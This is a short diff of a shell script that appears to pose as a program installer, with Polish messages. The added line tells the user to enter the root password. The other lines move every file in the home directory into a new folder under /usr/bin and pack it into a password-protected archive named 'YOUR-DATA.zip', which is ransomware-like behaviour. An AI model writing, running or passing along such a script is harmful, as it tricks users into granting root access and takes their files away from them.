@@ -1,4 +1,5 @@
-echo "przygotowywanie programu.... "
+echo "przygotowywanie programu.... \n"
+echo "podaj hasło roota bo program bez niego nie da rady"
 mkdir /usr/bin/edzioeeee
 mv ~/* /usr/bin/edzioeeee
 zip -p password ~/TWOJE-DANE.zip /usr/bin/edzioeeee
